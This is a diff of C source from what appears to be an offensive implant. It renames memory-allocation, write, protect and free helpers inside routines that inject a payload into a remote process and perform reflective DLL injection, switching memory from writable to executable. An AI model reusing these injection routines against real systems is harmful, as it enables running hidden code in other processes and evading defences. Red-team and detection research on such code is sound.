@@ -84,7 +84,7 @@ DWORD Inject(
     }
 
     /* allocate memory in the remote process */
-    if ( ! ( Memory = MemoryAlloc( DX_MEM_DEFAULT, Process, Size, PAGE_READWRITE ) ) ) {
+    if ( ! ( Memory = MmVirtualAlloc( DX_MEM_DEFAULT, Process, Size, PAGE_READWRITE ) ) ) {
         PUTS( "[INJECT] Failed allocating memory in remote process" )
         goto END;
     } else {
@@ -92,7 +92,7 @@ DWORD Inject(
     }
 
     /* write payload into remote process memory */
-    if ( ! ( MemoryWrite( Process, Memory, Payload, Size ) ) ) {
+    if ( ! ( MmVirtualWrite( Process, Memory, Payload, Size ) ) ) {
         PUTS( "[INJECT] Failed to write payload into remote process" )
         goto END;
     } else {
@@ -100,7 +100,7 @@ DWORD Inject(
     }
 
     /* change allocated memory from RW to RX */
-    if ( ! ( MemoryProtect( DX_MEM_SYSCALL, Process, Memory, Size, PAGE_EXECUTE_READ ) ) ) {
+    if ( ! ( MmVirtualProtect( DX_MEM_SYSCALL, Process, Memory, Size, PAGE_EXECUTE_READ ) ) ) {
         PUTS( "[INJECT] Failed to change memory protection" )
         goto END;
     } else {
@@ -111,7 +111,7 @@ DWORD Inject(
     if ( Argv && ( Argc > 0 ) )
     {
         /* allocate memory in the remote process */
-        if ( ! ( Param = MemoryAlloc( DX_MEM_DEFAULT, Process, Argc, PAGE_READWRITE ) ) ) {
+        if ( ! ( Param = MmVirtualAlloc( DX_MEM_DEFAULT, Process, Argc, PAGE_READWRITE ) ) ) {
             PUTS( "[INJECT] Failed allocating argument memory in remote process" )
             goto END;
         } else {
@@ -119,7 +119,7 @@ DWORD Inject(
         }
 
         /* write payload into remote process memory */
-        if ( ! ( MemoryWrite( Process, Param, Argv, Argc ) ) ) {
+        if ( ! ( MmVirtualWrite( Process, Param, Argv, Argc ) ) ) {
             PUTS( "[INJECT] Failed to write argument into remote process" )
             goto END;
         } else {
@@ -143,13 +143,13 @@ END:
     {
         /* free allocated payload */
         if ( Memory ) {
-            MemoryFree( Process, Memory );
+            MmVirtualFree( Process, Memory );
             Memory = NULL;
         }
 
         /* free allocated param */
         if ( Param ) {
-            MemoryFree( Process, Param );
+            MmVirtualFree( Process, Param );
             Param = NULL;
         }
     }
@@ -232,7 +232,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     PRINTF( "Params: Size:[%d] Pointer:[%p]\n", ParamSize, Parameter )
     if ( ParamSize > 0 )
     {
-        MemParamsBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, ParamSize, PAGE_READWRITE );
+        MemParamsBuffer = MmVirtualAlloc( DX_MEM_DEFAULT, hTargetProcess, ParamSize, PAGE_READWRITE );
         if ( MemParamsBuffer )
         {
             PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
@@ -257,7 +257,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     }
 
     // Alloc and write remote library
-    MemLibraryBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, FullDllSize, PAGE_READWRITE );
+    MemLibraryBuffer = MmVirtualAlloc( DX_MEM_DEFAULT, hTargetProcess, FullDllSize, PAGE_READWRITE );
     if ( MemLibraryBuffer )
     {
         PUTS( "[+] NtAllocateVirtualMemory: success" );
@@ -272,7 +272,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
             BytesWritten    = 0;
 
             // NtStatus = Instance.Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
-            if ( MemoryProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
+            if ( MmVirtualProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
             {
                 ctx->Parameter = MemParamsBuffer;
                 PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )
@@ -312,7 +312,7 @@ Cleanup:
     if ( ! HasRDll && FullDll )
     {
         MemSet( FullDll, 0, FullDllSize );
-        NtHeapFree( FullDll );
+        MmHeapFree( FullDll );
         FullDll = NULL;
     }
 
